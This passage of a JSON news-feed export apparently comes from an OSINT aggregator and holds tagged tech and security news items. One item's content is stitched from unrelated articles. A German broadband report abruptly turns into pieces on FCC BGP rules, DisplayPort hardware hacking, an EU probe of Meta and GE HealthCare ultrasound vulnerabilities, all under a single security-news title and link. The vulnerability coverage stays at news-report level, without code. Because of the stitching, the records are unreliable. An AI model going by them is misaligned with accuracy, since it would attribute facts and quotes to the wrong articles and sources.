erh\u00e4ltlich.\n(vat)", "hash": "3d68dd1e669de55bde4427fcbc2270213cc071c76d7b4b99cbb0a77ddf392b77", "id": "6d79201b-fa6e-4d6f-9278-558a78320eee", "link": "https://www.heise.de/news/Fujifilm-stellt-neue-Mittelformatkamera-GFX100S-II-vor-9720375.html?wt_mc=rss.red.ho.ho.atom.beitrag.beitrag", "osint_source_id": "d37999dd-31d9-4ef8-8675-185f97752b44", "published": "2024-05-16T17:48:00", "source": "https://www.heise.de/rss/heise-atom.xml", "story_id": "499a0d73-1c2f-410d-8edc-14aa8f0f12f7", "title": "Fujifilm stellt neue Mittelformatkamera GFX100S II vor"}], "tags": {"Euro": {"name": "Euro", "tag_type": "MISC"}, "Fujifilm": {"name": "Fujifilm", "tag_type": "ORG"}, "Fujinon Telekonverter": {"name": "Fujinon Telekonverter", "tag_type": "MISC"}, "GFX100S": {"name": "GFX100S", "tag_type": "MISC"}, "GFX100S II": {"name": "GFX100S II", "tag_type": "MISC"}, "ISO 80": {"name": "ISO 80", "tag_type": "MISC"}}, "title": "Fujifilm stellt neue Mittelformatkamera GFX100S II vor"}, {"attributes": [{"created": "2024-05-17T01:13:33.078807", "id": "d5f37989-329d-4316-85d7-2081cdaf14a9", "key": "NLP_BOT", "value": "12"}], "created": "2024-05-16T17:44:02", "id": "6e5d67d5-a2ff-4cae-ae22-cb15a6116f26", "news_items": [{"author": "Kevin Purdy", "content": "It's amazing, and a little sad, to think that something created in 1989 that changed how people used and viewed the then-nascent Internet had nearly vanished by 2024.\nNearly, that is, because the dogged researchers and enthusiasts at The Serial Port channel on YouTube have found what is likely the last existing copy of Archie. Archie, first crafted by Alan Emtage while a student at McGill University in Montreal, Quebec, allowed for the searching of various \"anonymous\" FTP servers around what was then a very small web of universities, researchers, and government and military nodes. It was groundbreaking; it was the first echo of the \"anything, anywhere\" Internet to come. And when The Serial Port went looking, it very much did not exist.\nWhile Archie would eventually be supplanted by Gopher, web portals, and search engines, it remains a useful way to index FTP sites and certainly should be preserved. The Serial Port did this, and the road to get there is remarkable and intriguing. You are best off watching the video of their rescue, along with its explanatory preamble. But I present here some notable bits of the tale, perhaps to tempt you into digging further.\nThe Serial Port notes the general loss of the Internet's FTP era, including the recent shutdown of the Hobbes OS/2 Archive. Emtage, interviewed at length by the team, sent a tape copy of Archie to the Computer History Museum in Mountain View, California, but it was unrecoverable. Emtage's company, Bunyip Information Systems, last sold version 3.5 of Archie's server software for $6,000 in the mid-1990s (almost $12,000 today), and yet you can't find it anywhere on the web. The Internet Archive wasn't really running until 1996, just as Archie was fading from the web and, likely, memory.The Serial Port team works dozens and dozens of resources to find a working copy of Archie's code, including the Internet Old Farts Club on Facebook. I won't give away the surprising source of their victory, but cheers (or na zdrowie) to the folks who keep old things running for everyone's knowledge.\nNot only did The Serial Code rescue the last working version of Archie (seemingly a 3.5 beta), but they posted its docs and now run an actual Archie server on an emulated Sun SPARCstation 5. It's currently indexing its own mirror of the Hobbes archive, along with the FTP sites for FreeBSD, Adobe, and D Bit emulation. Searching for \"word\" in Archie found me a bunch of files, including the classic \"Antiword\" app and password managers and generators for OS/2.\nEmtage, who would later help define the Uniform Resource Locator (URL) standard, gave his blessing to The Serial Port's efforts to recapture and preserve the code of Archie's server. It's a happy ending to a story about archiving the early Internet in a way that's relevant to today, with hopefully more to come.\nListing image by The Serial Port/YouTube\nreader comments\n41", "hash": "b28963309585403e6973286d949090e5c5a14485b2cb7361e02bc296da62dc0f", "id": "e5512c6b-867c-4391-83d1-5a9346969c05", "link": "https://arstechnica.com/?p=2024876", "osint_source_id": "a71fce67-918e-4ec0-bd23-e575b5149c1b", "published": "2024-05-16T17:44:02", "source": "http://feeds.arstechnica.com/arstechnica/technology-lab", "story_id": "6e5d67d5-a2ff-4cae-ae22-cb15a6116f26", "title": "Archie, the Internet\u2019s first search engine, is rescued and running"}], "tags": {"Adobe": {"name": "Adobe", "tag_type": "MISC"}, "Alan Emtage": {"name": "Alan Emtage", "tag_type": "PER"}, "Antiword": {"name": "Antiword", "tag_type": "MISC"}, "Archie": {"name": "Archie", "tag_type": "PER"}, "Bunyip Information Systems": {"name": "Bunyip Information Systems", "tag_type": "ORG"}, "California": {"name": "California", "tag_type": "LOC"}, "Emtage": {"name": "Emtage", "tag_type": "ORG"}, "FreeBSD": {"name": "FreeBSD", "tag_type": "MISC"}, "Internet": {"name": "Internet", "tag_type": "MISC"}, "Montreal": {"name": "Montreal", "tag_type": "LOC"}, "Quebec": {"name": "Quebec", "tag_type": "LOC"}, "YouTube": {"name": "YouTube", "tag_type": "MISC"}}, "title": "Archie, the Internet\u2019s first search engine, is rescued and running"}, {"attributes": [{"created": "2024-05-16T17:19:33.186049", "id": "b283dcb1-b919-49ea-9251-d8b2f647bb71", "key": "NLP_BOT", "value": "4"}], "created": "2024-05-16T17:42:00", "id": "96d85f6d-7a2e-4239-9b7c-eeecb374c641", "news_items": [{"author": "Stefan Krempl", "content": "Schlie\u00dfung von Krankenh\u00e4usern f\u00fchrt zunehmend zu weniger Datenschutz\nDie Datenschutzkonferenz beklagt gro\u00dfe Regelungsl\u00fccken, wenn Kliniken pleite gehen. Unbefugte k\u00f6nnten sich Zugang zu den sensiblen Krankenakten verschaffen.\nAuf ihrer 107. Sitzung in Bremerhaven hat die Konferenz der unabh\u00e4ngigen Datenschutzaufsichtsbeh\u00f6rden des Bundes und der L\u00e4nder (DSK) an Leitungskr\u00e4fte, Tr\u00e4ger und Interessenvertretungen von Kliniken sowie an Politik und Verwaltung appelliert, \"sich fr\u00fchzeitig mit den datenschutzrechtlich relevanten Auswirkungen der f\u00fcr die Zukunft zu bef\u00fcrchtenden weiteren Krankenhausschlie\u00dfungen zu befassen\". In den vergangenen Monaten habe etwa die Zahl einschl\u00e4giger Klinik-Insolvenzen bundesweit stark zugenommen. Die DSK nimmt dies vor allem mit Blick auf die \"in den Einrichtungen vorgehaltenen besonders schutzbed\u00fcrftigen Behandlungsdokumentationen\" der Patienten mit Sorge zur Kenntnis.\nAufbewahrung hochsensibler Daten zunehmend nicht sicher\nDie Kontrolleure sehen sich laut ihrer Resolution zunehmend mit F\u00e4llen konfrontiert, \"in denen eine sichere Aufbewahrung und der Zugang der Betroffenen zu den Patientendaten nicht gew\u00e4hrleistet waren\". Teilweise habe sogar die Gefahr bestanden, \"dass sich Unbefugte Zugang zu den Krankenakten\" verschafften. Kosten zum Sichern der Unterlagen k\u00f6nnten erfahrungsgem\u00e4\u00df \"ab einem gewissen Zeitpunkt nicht mehr durch den Insolvenzverwalter getragen werden\". Habe die Suche nach anderen rechtlich Verantwortlichen keinen Erfolg, gebe es im Bereich der Krankenhausbehandlung keine bundesweiten Vorschriften, \"durch wen und in welcher Form die weitere Aufbewahrung einschlie\u00dflich der L\u00f6schung der Patientendaten erfolgen muss\" und wie Patienten Zugang zu den sie betreffenden Behandlungsdokumentationen erhielten.\nDie DSK appelliert daher nachdr\u00fccklich an die Entscheidungstr\u00e4ger, bestehende Regelungsl\u00fccken zu schlie\u00dfen, f\u00fcr Rechtssicherheit zu sorgen und Finanzierungsl\u00f6sungen wie Fonds auf die Beine zu stellen. Daf\u00fcr k\u00f6nnten die Landeskrankenhausgesetze von Nordrhein\u2010Westfalen und Hessen Pate stehen. Damit sind dortige Kliniken verpflichtet, Konzepte zur weiteren Verwahrung der Patientenakten f\u00fcr den Fall der Insolvenz oder der ungeplanten Schlie\u00dfung anzufertigen. Bis dahin sollten die relevanten Interessenvertreter gemeinsam datenschutzkonforme L\u00f6sungen entwickeln. Die Gesundheitsministerkonferenz sollte sich m\u00f6glichst bald mit dem Problem befassen.\n(mack)", "hash": "f6dcbac9f629e4681cc6bc07a73f23fdd0763ba91712b2aeb6ce7f179de9f9ca", "id": "553c567d-bc15-429a-bbec-b43e76c9dc46", "link": "https://www.heise.de/news/Schliessung-von-Krankenhaeusern-Ruf-nach-besserem-Schutz-von-Patientendaten-9721517.html?wt_mc=rss.red.ho.ho.atom.beitrag.beitrag", "osint_source_id": "d37999dd-31d9-4ef8-8675-185f97752b44", "published": "2024-05-16T17:42:00", "source": "https://www.heise.de/rss/heise-atom.xml", "story_id": "96d85f6d-7a2e-4239-9b7c-eeecb374c641", "title": "Schlie\u00dfung von Krankenh\u00e4usern f\u00fchrt zunehmend zu weniger Datenschutz"}], "tags": {"Bremerhaven": {"name": "Bremerhaven", "tag_type": "LOC"}, "DSK": {"name": "DSK", "tag_type": "ORG"}, "Hessen": {"name": "Hessen", "tag_type": "LOC"}, "Nordrhein\u2010Westfalen": {"name": "Nordrhein\u2010Westfalen", "tag_type": "LOC"}}, "title": "Schlie\u00dfung von Krankenh\u00e4usern f\u00fchrt zunehmend zu weniger Datenschutz"}, {"attributes": [], "created": "2024-05-16T17:38:01", "id": "1032dadd-b68b-4bef-b1c9-52f548ae2f31", "news_items": [{"author": "", "content": "Fragen?

Die Anzahl der mit Glasfaser versorgten beziehungsweise unmittelbar erreichbaren Endkunden (Homes Passed) hat sich im Jahr 2023 um 37 Prozent gegen\u00fcber dem Vorjahr auf 17,9 Millionen erh\u00f6ht. Das geht aus dem Jahresbericht Telekommunikation 2023 (PDF) der Bundesnetzagentur hervor.\nDer Anteil aktiver FttH/FttB-Anschl\u00fcsse (Homes Activated) an den gesamten aktiven Breitbandanschl\u00fcssen in Festnetzen ist von 9,1 Prozent im Jahr 2022 auf 11,2 Prozent zum Jahresende 2023 gestiegen, hei\u00dft es weiter in dem Bericht. Die nach Ansicht der Bundesnetzagentur geringe Verbreitung solcher Anschl\u00fcsse sei vor allem auf den hohen Versorgungsgrad mit bestehenden leistungsf\u00e4higen Infrastrukturen wie VDSL-Vectoring und HFC-Netze zur\u00fcckzuf\u00fchren.

Damit setzt sich der kontinuierliche R\u00fcckgang von Festnetzgespr\u00e4chsvolumen weiter fort, der durch die Pandemie unterbrochen wurde.\n\u00dcber Mobilfunknetze im Inland wurden 2023 rund 153,5 Milliarden abgehende Gespr\u00e4chsminuten gef\u00fchrt. Dies entspricht durchschnittlich rund 122 Minuten monatlich pro aktivem SIM-Profil. Den R\u00fcckgang des Gespr\u00e4chsvolumens um knapp vier Prozent erkl\u00e4rt die Beh\u00f6rde unter anderem damit, dass zunehmend \"nummernunabh\u00e4ngige interpersonelle Telekommunikationsdienste\" genutzt w\u00fcrden, insbesondere Messenger- und Videokonferenz-Dienste.\nWachstum der Messenger- und Videokonferenz-Dienste\nDas \u00fcber diese Dienste abgewickelte Kommunikationsvolumen wuchs 2023 von 13,2 Milliarden auf 15,8 Milliarden abgehende Sprachtelefonie-Anrufe; das Gespr\u00e4chsvolumen wuchs hier von 121 Milliarden auf 175 Milliarden Minuten. Hinzu kommen 8,2 Milliarden abgehende Video-Anrufe \u00fcber Messenger- und Videokonferenz-Dienste gegen\u00fcber 7,7 Milliarden im Jahr 2022 ein Wachstum der gesamten Videotelefonie-Minuten von 143 Milliarden auf 176 Milliarden.\nDas in Festnetzen in Deutschland \u00fcbertragene Datenvolumen wuchs 2023 um 11 Milliarden GB auf 132 Milliarden GB.

It can get \u201chijacked,\u201d however, resulting in traffic being diverted to malicious sites.\n\u201cThese \u2018BGP hijacks\u2019 can expose personal information, enable theft, extortion, and state-level espionage, and disrupt security-critical transactions, including in the financial sector,\u201d the FCC warned last year.\nIf approved by the five-member body in June, the proposal by FCC Chairwoman Jessica Rosenworcel on Wednesday would mandate that broadband providers supply regular data on how they are handling BGP security.\nIt would require them to develop BGP security plans and to document how they plan to, or are already, using what\u2019s known as the Resource Public Key Infrastructure \u2014 a security framework using cryptography created in 2008.\nNine of the largest providers would need to file their plans with the FCC, as well as quarterly data \u201cthat would allow the Commission to measure progress in the implementation of RPKI-based security measures and assess the reasonableness of their BGP Plans.\u201d\n\u201cIt is vital that communication over the internet remains secure,\u201d Rosenworcel said in an agency announcement. \u201cAlthough there have been efforts to help mitigate BGP's security risks since its original design, more work needs to be done.\u201d\nConcerns about BGP security have ramped up in recent years. In February 2022, the FCC first launched an inquiry on the matter, citing specific incidents in which sensitive internet traffic routed through Russian government-controlled telecommunications companies.

This time, I want to give you a project library to reference, so that your hacking goes as smoothly as possible \u2013 real-world examples of open-source DisplayPort boards, a few boards I\u2019ve worked on, part numbers, and whatever other information you might need.\nOver the past few years, I\u2019ve noticed that a non-zero amount of cyberdeck builders buy eDP screens with HDMI converter boards on Aliexpress, then connect them to SBCs using USB-C to HDMI adapters, or ignore the onboard eDP port; even this super cool Framework-based cyberdeck has done that! I get that it\u2019s the simplest option, but I do believe that you ought to know how to improve it. The issue is that this double-conversion decreases the battery life significantly by burning two extra ASICs doing video conversion back and forth. Every hour of battery life matters in a cyberdeck, doubly so if it\u2019s based on a low-power device already \u2013 you could easily cut your battery life in half if you\u2019re not careful!\nWith these projects and references in your arsenal, my aim is that DisplayPort becomes way more comfortable for you to work with. Thankfully, there are quite a few projects to reference by now \u2013 let\u2019s delve in.\nRight out of the gate \u2013 are you looking for an SBC with DisplayPort support? The BoardDB website, a database of single-board computers, has a DisplayPort filter \u2013 click this link with the filter already enabled and browse through.\nGateway Tablets\nPerhaps the most omnipresent open-source DisplayPort project is the Adafruit adapter for iPad Retina displays. When iPad Retina displays became available to hackers, as far as I can tell, it was [Andrzej] who discovered that they were using the eDP interface, and figured out that you could easily convert it to DisplayPort. Eventually, that led to Adafruit making an adapter board they could mass-produce \u2013 which is one of the best outcomes for such an idea! We\u2019ve seen proprietary boards for these displays being sold since then, even with USB-C DP altmode support \u2013 but the Adafruit board is open-source, which makes for a way better start, more so given they have cool tutorials to go with it.\nThere\u2019s many things you can learn from this board, and some things you shouldn\u2019t. Well, one thing you shouldn\u2019t \u2013 the trace routing on the Adafruit board is seriously puzzling, even though it undeniably works. However, it gives you an example on how to drive a bare backlight \u2013 something you still might have to do when it comes to tablet displays. Oh, and there\u2019s an ATTiny for managing the PWM input of the backlight driver, and a few buttons \u2013 if you\u2019re making your own eDP adapter and you need a backlight driver controller, you could do worse than yanking their ATTiny firmware and schematic.\nNow, this has kickstarted a fair bit more eDP hacking \u2013 like this Retina adapter we\u2019ve covered a few years ago, there\u2019s been other boards for other eDP displays, too; and, iPad screens are still here and available for purchase. The bottom line is that wiring up an eDP display is easy, and it might make your cyberdeck all that more practical. Now, a Raspberry Pi with a DisplayPort connection would be awesome to have, but I suppose RPF\u2019s allegiance to Broadcom\u2019s allegiance to HDMI makes it unlikely \u2013 until someone figures out an accessible and Pi-compatible DSI-DP converter, or at least, I can dream.\nLaptop Panel Handling And Connectors\nHere\u2019s something I no longer have to dream about \u2013 an adapter from DisplayPort to different eDP connectors, that [WifiCable] and I have recently designed. Remember \u2013 eDP displays only use two different connectors, and, there\u2019s an abundance of FPC-to-eDP cables on Aliexpress and other Eastern marketplaces, so you might only need to add an FFC connector onto your board. As for pinouts, this adapter supports four different eDP pinouts with three connectors, including the pinout of the Asus ROG Ally display, and it handles touch-enabled displays too.\nSince the DP signal goes to three connectors at once, there\u2019s some suboptimal stubs involved, but it\u2019s an experimental enough board that I\u2019m not particularly worried. The capacitors are added inline, but can be bypassed with 0 \u03a9 jumpers if you so desire \u2013 as I\u2019ve been saying, footprints are free. And, this board is currently untested \u2013 we\u2019ve only just ordered it and will be assembling it within like a month. That said, I\u2019m open-sourcing it now \u2013 it has enough work put in that it\u2019ll already be useful. Also, in the near future, I plan to convert the DisplayPort socket to a USB-C port with DP altmode support, and use the existing USB-C socket for charging input \u2013 that will be a fun adventure!\nFrom this board\u2019s files, you can get things like the eDP panel pinouts you can copy-paste into your KiCad project, as well as footprint and symbol for a DisplayPort connector. Now, to be clear, we got the footprint and symbol from LCSC. You can find DisplayPort sockets on Mouser and Digikey, but LCSC is that much cheaper.\nActually locating DisplayPort parts on LCSC is tricky, but gets way easier after you follow some simple rules. First rule is \u2013 don\u2019t only check the DisplayPort category, since manufacturers seem to often ignore it; check the D-Sub/VGA connector category, too. Second rule is \u2013 do not touch absolutely any filters, make sure all of them are disabled \u2013 you have to do this because filters on LCSC are deeply broken; the only thing you can touch is \u201cIn Stock\u201d, so only check that. Third rule is \u2013 set \u201citems per page\u201d to 100, for your own sanity\u2019s sake. Maybe complain to them so that they bring back the 500 option, because I\u2019m personally tired of doing that, only for them to again limit it back to 100 a month later.\nAlso, here\u2019s a DisplayPort socket on LCSC, and another, and another, and here\u2019s a miniDisplayPort socket; please don\u2019t buy them all out, thanks. There\u2019s no shortage of chips either, just that they can be a bit tricky to find. For instance, do you want high-speed muxes? Here\u2019s two independent KiCad projects who do DisplayPort \u201cone port to many ports\u201d KVM-style muxing; this one just does DP and this one also supports USB. It\u2019s no MST, but if you want to switch between screens or DisplayPort sources, it\u2019s a pretty viable solution! In general, if you look up \"AUX+\" kicad\nin the GitHub search bar, you can find out about some fun boards, and even find ICs you might\u2019ve otherwise missed.\nAs an aside, if your DP transmitter does DP++, the MXM immobilizer project from [WifiCable] gives you a reference implementation that supports both DisplayPort and HDMI/DVI backwards compatibility mode on your connector. This one has been taken from working laptop schematics; that said, this design hasn\u2019t been tested. This PCIe-MXM design was tested, though, and even though the license is super restrictive, you should still be able to check schematics, especially if you go to the commit before the author deleted the KiCad port of this adapter.\nUSB-C DP Altmode And Motherboard Hacking\nHere\u2019s another design you can make use of: a USB-C to eDP converter. I\u2019ve recently been finishing bringup of this board, and while I got a little stuck on making the firmware perfect before making it actually work, the AUX connection has indeed after bodging two resistors onto it, which are now integrated into the design. The only area yet unexplored are the main DP lanes, which, I\u2019m sure, have no problems at all and will work wonderfully first try as soon as I figure out the right VDM (edit: I have since done more adapter bringup work and realized I\u2019ve mixed up the main lanes, a fix has already been pushed to the repo). I\u2019ve partially covered this design in the Altmode Taming article and talked some about DisplayPort USB-C muxes, but I haven\u2019t published it yet at that point, and that was long overdue, so here you go.\nReally, the main things you can borrow from here is the mux implementation, and USB-C to DisplayPort routing if you\u2019re fancy. However, there\u2019s also the connector being used \u2013 it\u2019s a nice one. If the connector doesn\u2019t look familiar, that\u2019s because it\u2019s the connector used on the Framework laptop, for the KVM conversion mode that I\u2019ve been working on. The Framework\u2019s eDP connector is overall pretty capable \u2013 four lanes *and* touchscreen connection, all within just 40 pins! It\u2019s capable enough that even system76\u2019s Virgo, a WIP open-source laptop design, appears to use it; that said, they\u2019ve confused the polarity because of Framework\u2019s initially confusing data, so I hope they take note of this whenever they resume work.\nThis connector may look tricky to solder onto your board, what\u2019s with the pads being fully hidden, and it is tricky to both solder and repair, but it\u2019s a pretty suitable choice if you are decent at stenciling. Also, thanks to Framework as of recently, you can buy their cables separately\u2013 they\u2019re locked into the 40-pin high-res pinout and you can\u2019t easily change that, but you could definitely add an adapter if needed. If you\u2019re looking for a fancy connector that still supports more hobbyist-oriented soldering methods, however, a good middle ground is using the I-PEX connector that eDP laptop displays themselves use, and then finding a male-male cable with microcoax wires on either Aliexpress or Digikey.\nFramework\u2019s connector is the connector you will want to use if you want to connect an arbitrary display to a Framework mainboard, too, and it\u2019s not easy to make custom cables for it. That\u2019s not an uncommon situation \u2013 some of the SBCs with DisplayPort in the SBC database list I\u2019ve linked, will too have it on a connector that ain\u2019t easy to work with; watch out! Fortunately, even here, you could use the Framework\u2019s cable, plug it into the Framework motherboard, and put an I-PEX 40-pin high-res pinout socket on your adapter board \u2013 that\u2019s what I\u2019m currently doing for a small and yet-unfinished project of mine. Otherwise, if you need the touchscreen signals that Framework cable doesn\u2019t pass through, you could do a breakout with a male-male cable; as long as you\u2019re okay spending $50 on a cable, that is.\nDisplayPort is not always faultless \u2013 for instance, you might find out that your SBC\u2019s DisplayPort driver has not been tested with lane widths less than four, as [Timon] found out during the [Damn Linux Tablet] project. Nevertheless, if you connect a random eDP display to a random eDP device, due to the auto-discovery mechanism over AUX being a link requirement, it\u2019s highly likely to just work \u2013 as opposed to the old LVDS days; and, making hardware for DisplayPort is seriously easy.\nCapacitors, Resistors, And PDFs\nWhen you see some of the open-source boards, you might see series capacitors, perhaps, even pullup or pulldown resistors on the AUX line, too. They\u2019re something I ought to have expanded upon in the Under The Hood installment, but the second best time is to do it now, before the boards might leave you confused. An official DisplayPort spec will help with both of these \u2013 you can find it easily enough by looking up DP-1.2.pdf\n; I couldn\u2019t find higher version specs PDF names for you since they\u2019re not public. There\u2019s no spec for embedded DisplayPort that I could find, and it\u2019d be wonderful to take a look, so if someone has it handy, please do let me know!\nYou need series capacitors for both the AUX link (1.2 spec page 329) and the main link pairs (page 362); range is 75 to 200 nF, so regular 100 nF will do. The 0402 package is preferred, but 0603 is possible. Main link capacitors are only required on transmitter (source = upstream) end, but you can put them on the receiver (sink = downstream) end too if you\u2019d like. Remember that stacking capacitors in series causes the overall capacitance to decrease in the same exact way that resistance decreases when you stack resistors in parallel, so you might not want to overdo it.\nThe AUX channel is a differential pair \u2013 as you might remember, it\u2019s used for monitor parameter querying, link training, configuration, and things like audio. Just like USB2, it\u2019s pseudodifferential \u2013 there\u2019s resistors that sometimes have to be used for your device to be detected, or for the bus to be properly biased to work. The transmitter pulls AUX+ down and AUX- up to 3.3V, the receiver pulls AUX- up and AUX+ down. Oh, and remember HPD? It needs a 100k-ish pulldown on the device side (page 327).\nDo you need either capacitors or resistors for a regular DP adapter? Likely not \u2013 a DisplayPort source will integrate them, and your display might, too. However, they might be useful if you\u2019re working on a USB-C adapter or adding muxes to the equation, and it helps to know that they\u2019re sometimes required.\nAll in all, DisplayPort is a great option for your displays, and it\u2019s one you deserve to be able to work with \u2013 there\u2019s no shortage of DisplayPort hardware around us. May these designs and references help you in your own DisplayPort forays, no matter what you might be building.\nI thank [WifiCable] for help in compiling the materials and links for this article!\n8 thoughts on \u201cDisplayPort: Hacking And Examples\u201d\nComprehensive Article. Unfortunately there are no cheap DP capture solutions, or are there? Probably adapting to HDMI is the cheapest way.\nOn a slightly related note, I recently (ab)used cheap ($8) USB 3.0 HDMI capture dongles together with a small Tang nano FPGA board to shovel 180 MB/s arbitrary data into a PC, and even used that to build a small SDR prototype with 90 MHz bandwidth. I gave a talk about it at OsmoDevCon in case anyone is interested:\nhttps://steve-m.de/projects/osmodevcon24_hsdaoh.mp4\nhttps://github.com/steve-m/hsdaoh\nyeah my hunch is that adapting to HDMI is indeed cheapest&easiest at this point in time \u2013 and, oh that\u2019s an awesome project! noted, thank you for sharing ^_^\nThose articles on modern display standards are excellent, makes the whole topic less intimidating for a beginner.\nBeing tasked with finding a way to feed video network stream and outputting at least 8 different video channels (with possibility to switch between NTSC and PAL), I thought about\nplaying one high-resolution video stream on a display port output,\nand using a FPGA to split the image in a 3\u00d73 matrix to 8 data channel to 8 chips that will output a proper composite video signal.\nIt seems doable without a missile-class FPGA, but video chips become hard to come by. I\u00b4ve tried to hunt for devices that take RTSP stream(s) in and output several video channels, it\u00b4s rare and very expensive, especially that i need literally hundreds of video outputs!\n\u2026 i\u00b4m a bit stuck with that. Having to learn use and source parts for analog video in those modern days is hard!\nGreat article! The \u201cramen routing\u201d section is actually trace length matching (serpentine routing). DP uses differential signal pairs and matching the trace length within a pair is important to maintain signal integrity and lower EMI. Also common on PC motherboards (i.e PCI bus lanes).\nA couple references:\nhttps://e2e.ti.com/cfs-file/__key/CommunityServer.Discussions.Components.Files/48/0552.Texas-Instruments-DisplayPort-Design-Guide.pdf\nhttps://www.nxp.com/docs/en/application-note/AN10798.pdf\nI\u2019ve read both of these appnotes and more. You are supposed to keep the tracks together, and also make sure that the amount of via transitions is equal on each track \u2013 this routing does neither, if you look closely. Also, the tracks travel a straight path, so it\u2019s not even clear why you\u2019d need to do any considerable amount of length matching here, much less in the way it was done. So, it\u2019s just puzzling on why things were done this way, but, again, it\u2019s fun to see that it works!\nGood points. Admittedly I did not look super close because the text silkscreen was in the way. Took a look in Eagle. It is definitely curious routing, but if it works? Thanks for your in depth articles!\nyeah my bad on that, should\u2019ve made a better pic. and, glad to hear you\u2019ve liked the articles! ^~^\nAll of those Adafruit products are discontinued.

Maybe not\nThe European Commission has opened formal proceedings to assess whether Meta, the provider of Facebook and Instagram, may have breached the Digital Services Act (DSA) in areas linked to the protection of minors.\nThe action follows a separate probe into Meta's alleged failure to properly monitor the distribution of political misinformation by \"foreign actors\" before June's European elections.\nThe latest action means the executive of the European Union will examine three potential breaches of the DSA, first introduced in August last year. The legislation allows for fines up to 6 percent of worldwide annual turnover, which in Meta's case would equate to around $8.5 billion.\nFirstly, the Commission will investigate whether the social media giant has assessed and mitigated risks caused by the design of Facebook and Instagram's online interfaces, \"which may exploit the weaknesses and inexperience of minors and cause addictive behaviour, and/or reinforce the so-called 'rabbit hole' effect.\"\nSecondly, the Commission will examine whether Meta did enough to prevent access by minors to inappropriate content. In particular, it questions whether age-verification tools used by Meta have been reasonable, proportionate and effective.\nLastly, the Commission put Meta's compliance with DSA obligations under the microscope by looking at whether it has taken \"appropriate and proportionate measures\" to ensure a high level of privacy, safety, and security for minors. In particular, it will examine whether default privacy settings for minors and recommendation systems comply with the law.\nEach strand of the investigation relates to Articles 28, 34, and 35 of the DSA respectively. The Commission is set to continue the investigation by sending additional requests for information, and conducting interviews or inspections.\nThierry Breton, commissioner for the internal market, said the Commission was not convinced that Meta has done enough to comply with the DSA on Facebook and Instagram.\n\"We will now investigate in-depth the potential addictive and 'rabbit hole' effects of the platforms, the effectiveness of their age verification tools, and the level of privacy afforded to minors in the functioning of recommender systems. We are sparing no effort to protect our children,\" he said.\nA Commission official noted that it will investigate Facebook and Instagram separately as they are distinct platforms under the legislation.

Other identified shortcomings relate to command injection (CVE-2024-1628), execution with unnecessary privileges (CVE-2024-27110 and CVE-2020-6977), path traversal (CVE-2024-1630 and CVE-2024-1629), and protection mechanism failure (CVE-2020-6977).\nThe exploit chain devised by Nozomi Networks takes advantage of CVE-2020-6977 to get local access to the device and then weaponizes CVE-2024-1628 to attain code execution.\n\"However, to speed up the process, [...] an attacker may also abuse the exposed USB port and attach a malicious thumb drive that, by emulating the keyboard and mouse, automatically performs all necessary steps at faster-than-human speed,\" the company said.\nAlternatively, an adversary could obtain access to a hospital's internal network using stolen VPN credentials gathered via other means (e.g., phishing or data leak), scan for vulnerable installations of EchoPAC, and then exploit CVE-2024-27107 to gain unfettered access to the patient's database, effectively compromising its confidentially, integrity, and availability.\nGE HealthCare, in a set of advisories, said \"existing mitigations and controls\" reduce the risks posed by these flaws to acceptable levels.\n\"In the unlikely event a malicious actor with physical access could render the device unusable, there would be clear indicators of this to the intended user of the device,\" it noted. \"The vulnerability can only be exploited by someone with direct, physical access to the device.\"\nThe disclosure comes weeks after security flaws were also uncovered in the Merge DICOM Toolkit for Windows (CVE-2024-23912, CVE-2024-23913, and CVE-2024-23914) that could used to trigger a denial-of-service (DoS) condition on the DICOM service. The issues have been addressed in version v5.18 [PDF] of the library.\nIt also follows the discovery of a maximum-severity security flaw in the Siemens SIMATIC Energy Manager (EnMPro) product (CVE-2022-23450, CVSS score: 10.0) that could be exploited by a remote attacker to execute arbitrary code with SYSTEM privileges by sending maliciously crafted objects.\n\"An attacker successfully exploiting this vulnerability could remotely execute code and gain complete control over an EnMPro server,\" Claroty security researcher Noam Moshe said.\nUsers are highly recommended to update to version V7.3 Update 1 or later as all versions prior to it contain the insecure deserialization vulnerability.\nSecurity weaknesses have also been unearthed in the ThroughTek Kalay Platform integrated within Internet of Things (IoT) devices (from CVE-2023-6321 through CVE-2023-6324) that allows an attacker to escalate privileges, execute commands as root, and establish a connection with a victim device.\n\"When chained together, these vulnerabilities facilitate unauthorized root access from within the local network, as well as remote code execution to completely subvert the victim device,\" Romanian cybersecurity company Bitdefender said. \"Remote code execution is only possible after the device has been probed from the local network.\"\nThe vulnerabilities, patched as of April 2024 following responsible disclosure in October 2023, have been found to impact baby monitors, and indoor security cameras from vendors like Owlet, Roku, and Wyze, permitting threat actors to daisy-chain them in order to execute arbitrary commands on the devices.\n\"The ramifications of these vulnerabilities extend far beyond the realm of theoretical exploits, as they directly impact on the privacy and safety of users relying on devices powered by ThroughTek Kalay,\" the company added.", "hash": "9f34a80e7b5f02bf345dac94dd73affbf29836ce456a26f9900d0fffc7971d03", "id": "ed983fc9-dcbd-413f-80dc-ce212bbba3b1", "link": "https://thehackernews.com/2024/05/researchers-uncover-11-security-flaws.html", "osint_source_id": "ef5f3f17-365f-4dfb-889d-5a3ef3bdfff0", "published": "2024-05-16T15:42:00", "source": "http://feeds.feedburner.com/TheHackersNews", "story_id": "9a99d080-f25c-4fa5-aea1-99a99db9739b", "title": "Researchers Uncover 11 Security Flaws in GE HealthCare Ultrasound Machines"}], "tags": {"Bitdefender": {"name": "Bitdefender", "tag_type": "ORG"}, "CVE-2020-6977": {"name": "CVE-2020-6977", "tag_type": "cves"}, "CVE-2022-23450": {"name": "CVE-2022-23450", "tag_type": "cves"}, "CVE-2023-6321": {"name": "CVE-2023-6321", "tag_type": "cves"}, "CVE-2023-6324": {"name": "CVE-2023-6324", "tag_type": "cves"}, "CVE-2024-1628": {"name": "CVE-2024-1628", "tag_type": "cves"}, "CVE-2024-1629": {"name": "CVE-2024-1629", "tag_type": "cves"}, "CVE-2024-1630": {"name": "CVE-2024-1630", "tag_type": "cves"}, "CVE-2024-23912": {"name": "CVE-2024-23912", "tag_type": "cves"}, "CVE-2024-23913": {"name": "CVE-2024-23913", "tag_type": "cves"}, "CVE-2024-23914": {"name": "CVE-2024-23914", "tag_type": "cves"}, "CVE-2024-27107": {"name": "CVE-2024-27107", "tag_type": "cves"}, "CVE-2024-27110": {"name": "CVE-2024-27110", "tag_type": "cves"}, "DICOM": {"name": "DICOM", "tag_type": "MISC"}, "EchoPAC": {"name": "EchoPAC", "tag_type": "ORG"}, "IoT": {"name": "IoT", "tag_type": "MISC"}, "Noam Moshe": {"name": "Noam Moshe", "tag_type": "PER"}, "Nozomi Networks": {"name": 